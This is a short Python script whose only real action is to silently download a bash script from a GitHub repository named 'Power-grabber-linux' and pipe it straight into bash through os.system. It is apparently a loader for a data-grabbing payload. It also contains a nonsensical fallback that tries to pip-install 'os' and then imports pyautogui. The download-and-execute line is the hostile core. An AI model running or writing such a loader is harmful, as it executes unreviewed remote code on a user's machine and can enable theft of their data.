import time
import sys
import subprocess
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import os
except ImportError:
    install('os')
    import pyautogui
time.sleep(1)

# Command to download and execute the Bash script from GitHub
command = f"bash -c 'wget -qO- https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/main/taktikal | bash'"

# Execute the command
os.system(command)